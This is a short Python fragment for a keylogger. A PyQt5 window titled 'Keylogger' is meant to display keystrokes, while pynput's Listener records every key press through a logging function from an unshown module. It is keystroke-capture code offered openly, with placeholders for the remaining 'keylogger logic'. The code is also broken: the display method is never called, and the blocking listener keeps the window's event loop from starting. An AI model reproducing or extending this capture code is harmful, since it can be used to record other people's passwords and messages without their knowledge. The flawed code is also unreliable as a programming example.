import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QVBoxLayout
from pynput.keyboard import Listener
from key_convert import write_to_log

class KeyloggerWindow(QWidget):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Keylogger")
        self.setGeometry(300, 300, 300, 200)

        self.label = QLabel("Keystrokes:")
        self.textbox = QLineEdit()
        self.textbox.setReadOnly(True)

        layout = QVBoxLayout()
        layout.addWidget(self.label)
        layout.addWidget(self.textbox)

        self.setLayout(layout)

    def add_keystroke(self, keystroke):
        self.textbox.setText(self.textbox.text() + keystroke)

# ... (rest of your keylogger code)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = KeyloggerWindow()
    window.show()

    # Your keylogger logic, calling window.add_keystroke() to update the textbox
    # Listen for the keystrokes
    with Listener(on_press=write_to_log) as l:
        l.join()

    sys.exit(app.exec_())